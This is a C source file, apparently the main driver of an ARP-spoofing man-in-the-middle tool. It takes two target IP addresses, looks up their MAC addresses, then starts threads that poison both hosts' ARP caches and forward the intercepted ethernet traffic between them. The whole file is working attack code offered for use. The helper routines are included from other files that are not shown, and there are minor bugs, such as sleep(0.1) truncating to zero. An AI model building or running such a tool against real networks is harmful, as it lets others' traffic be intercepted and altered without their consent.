
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>

#include "usage.h"
#include "forwarding/include/forward.h"
#include "arp/include/arp.h"
#include "modularity/include/init.h"
#include "modularity/include/ec_malloc.h"

int main(int argc, char *argv[])
{
    if (argc < 3)
        usage(argv[0]);

    pthread_t threadForwardId, threadPoisonId;

    uint32_t target1Ip, target2Ip;
    uint8_t *target1_mac = ec_malloc(6);
    uint8_t *target2_mac = ec_malloc(6);

    u_char errbuf[LIBNET_ERRBUF_SIZE]; 
    libnet_t *l = init_libnet_ethernet(errbuf);
    pcap_t *handle = init_pcap(errbuf);

    // Convert Targets ASCII-IP's to Numbers
    if (((target1Ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
    || ((target2Ip = libnet_name2addr4(l, argv[2], LIBNET_DONT_RESOLVE)) ==  -1))
        fatal(libnet_geterror(l), "main.c, line 32");
    
    
    arp_request(target1Ip, l);
    while (arp_receive(handle, target1Ip, target1_mac) != 0) {
        sleep(0.1);   
        arp_request(target1Ip, l);
    }
    
    arp_request(target2Ip, l);
    while (arp_receive(handle, target2Ip, target2_mac) != 0) {
        sleep(0.1);
        arp_request(target2Ip, l);
    }


    struct poison_pass *pass_poison = ec_malloc(sizeof(struct poison_pass));
    pass_poison->mac1 = target1_mac;
    pass_poison->mac2 = target2_mac;
    pass_poison->ip1 = target1Ip;
    pass_poison->ip2 = target2Ip;
    pass_poison->l = l;


    // Start ARP-Poisoning on different thread 
    pthread_create(&threadPoisonId, NULL, arp_poison, (void *)pass_poison);
    
    // Start ethernet forwarding on different thread 
    pthread_create(&threadForwardId, NULL, forward, (void *)pass_poison);
    pthread_join(threadForwardId, NULL);
}